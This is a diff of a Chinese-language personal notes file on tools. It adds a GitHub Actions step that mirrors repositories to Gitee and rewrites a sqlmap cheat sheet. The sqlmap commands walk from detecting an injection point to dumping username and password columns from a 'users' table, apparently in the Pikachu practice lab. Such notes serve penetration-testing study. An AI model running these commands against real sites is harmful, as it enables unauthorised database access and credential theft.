@@ -45,17 +45,30 @@ you-get -u url
 ## Github
 <https://docs.github.com/cn>
 
+```shell
+steps:
+- name: Mirror the Github organization repos to Gitee.
+  uses: Yikun/hub-mirror-action@master
+  with:
+    src: github/Truman1970
+    dst: gitee/Truman1970
+    dst_key: ${{ secrets.GITEE_PRIVATE_KEY }}
+    dst_token: ${{ secrets.GITEE_TOKEN }}
+    account_type: user
+```
+
 
 ## Sqlmap
 <http://sqlmap.org/>
 
 ```shell
-sqlmap -u url    #检查注入点
-sqlmap -u url --dbs    #爆所有数据库信息
-sqlmap -u url --current-db    #爆当前数据库信息：
-sqlmap -u url -D pikachu --tables    #指定库名列出所有表
-sqlmap -u url -D pikachu -T users --columns    #指定库名表名列出所有字段
-sqlmap -u url -D pikachu -T users -C username,password --dump    #列出表里的值
+python sqlmap.py -u url    #检查注入点
+python sqlmap.py -u url --dbs    #爆所有数据库信息
+python sqlmap.py -u url --current-db    #爆当前数据库信息：
+python sqlmap.py -u url -D pikachu --tables    #指定库名列出所有表
+python sqlmap.py -u url -D pikachu -T users --columns    #指定库名表名列出所有字段
+python sqlmap.py -u url -D pikachu -T users -C username,password --dump    #列出表里的值
 
+python sqlmap.py --update       #更新
 
 ```
